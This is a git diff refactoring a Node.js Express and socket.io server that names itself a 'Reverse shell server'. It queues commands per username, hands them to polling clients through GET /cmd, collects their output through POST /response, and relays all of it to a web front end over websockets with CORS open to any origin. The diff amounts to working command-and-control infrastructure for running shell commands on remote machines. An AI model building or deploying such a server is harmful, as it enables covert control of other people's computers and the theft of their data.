@@ -6,9 +6,8 @@ import "express-async-errors"
 import createHttpError from "http-errors"
 
 import cors from "cors"
-import http from "http"
-// @ts-ignore
-import socketio from "socket.io"
+import { createServer } from "http"
+import { Server } from "socket.io"
 
 const { EXPRESS_PORT = 18000 } = process.env
 
@@ -18,17 +17,21 @@ const app = express()
 app.use(express.urlencoded({ limit: "50mb", extended: true }))
 app.use(cors())
 
-const http_server = http.createServer(app)
-const io = socketio(http_server)
+const httpServer = createServer(app)
+const io = new Server(httpServer, { cors: { origin: "*" } })
 
 type Client = {
   username: string
-  command: string
-  last_seen: Date
-  response?: string
+  command?: string
 }
 
 const clients: Client[] = []
+// const clients: Client[] = [
+//   {
+//     username: "bob",
+//     command: "standby",
+//   },
+// ]
 
 app.get("/cmd", (req, res) => {
   const { username } = req.query as { username: string | undefined }
@@ -39,25 +42,21 @@ app.get("/cmd", (req, res) => {
   // Check if the client is known already
   let client = clients.find((c) => c.username === username)
 
+  // If not add it to list of clients
   if (!client) {
-    client = {
-      username,
-      command: "standby",
-      last_seen: new Date(),
-    }
+    console.log(`${username} is a new client, adding to clients list`)
+    client = { username }
     clients.push(client)
   }
 
-  // timestamp the connection
-  client.last_seen = new Date()
-
   // Send the client to the front end
-  io.emit("request", client)
+  io.emit("client", client)
 
   // send the command to the client
   res.send(client.command)
 
   // Set the next command to standby, which does nothing on the client side
+  // TODO: just unset it
   client.command = "standby"
 })
 
@@ -65,39 +64,31 @@ app.post("/response", (req, res) => {
   const { username, output } = req.body
   if (!username) throw createHttpError(400, "username not provided")
 
-  console.log(`${username} provided a response`)
-  res.send("OK")
+  console.log(`${username} provided a response: ${output}`)
 
-  // Could execute next command here to increase speed
   const client = clients.find((c) => c.username === username)
 
-  // if found
-  if (client) {
-    console.log(client)
-    client.response = output
-    io.emit("response", client)
-  }
+  if (client) io.emit("response", { username, output })
+
+  res.send("OK")
 })
 
-// TODO: POST /command from UI instead of WS
-
-// TODO: update socket.io and type
-io.on("connection", (socket: any) => {
+io.on("connection", (socket) => {
   console.log("[WS] Socket.io client connected")
 
-  socket.on("new_command", (payload: any) => {
-    console.log("new command")
+  socket.on("command", (payload) => {
     const { username, command } = payload
+    console.log(`Command arrived for ${username}: ${command}`)
     if (!username) return
 
-    const client = clients.find((c) => (c.username = username))
-    if (!client) return
+    const client = clients.find((c) => c.username === username)
+    if (!client) return console.log("client not found")
 
     // set the new command
     client.command = command
   })
 })
 
-http_server.listen(EXPRESS_PORT, () =>
+httpServer.listen(EXPRESS_PORT, () =>
   console.log(`Reverse shell server listening on ${EXPRESS_PORT}`)
 )
